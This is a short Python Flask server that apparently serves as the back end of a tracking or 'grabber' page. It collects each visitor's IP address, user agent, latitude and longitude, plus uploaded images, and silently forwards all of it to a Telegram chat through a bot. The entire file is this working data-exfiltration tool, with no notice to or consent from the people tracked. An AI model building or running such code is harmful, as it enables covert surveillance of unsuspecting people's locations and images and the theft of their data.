import os, requests, tempfile
from flask import Flask, request, jsonify, send_from_directory

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
TG = f"https://api.telegram.org/bot{BOT_TOKEN}"

app = Flask(__name__, static_folder="static")

def tg_text(t):
    requests.post(f"{TG}/sendMessage", data={"chat_id": CHAT_ID, "text": t})

def tg_photo(path):
    with open(path, "rb") as f:
        requests.post(f"{TG}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": f})

@app.route("/")
def home():
    return send_from_directory("static", "index.html")

@app.route("/collect", methods=["POST"])
def collect():
    d = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")
    msg = f"IP: {ip}\nLat: {d.get('lat')}\nLon: {d.get('lon')}\nUA: {ua}"
    tg_text(msg)
    return jsonify(ok=True)

@app.route("/upload", methods=["POST"])
def upload():
    img = request.files["img"]
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
        img.save(f.name)
        tg_photo(f.name)
    os.unlink(f.name)
    return jsonify(ok=True)

app.run(host="0.0.0.0", port=5000)
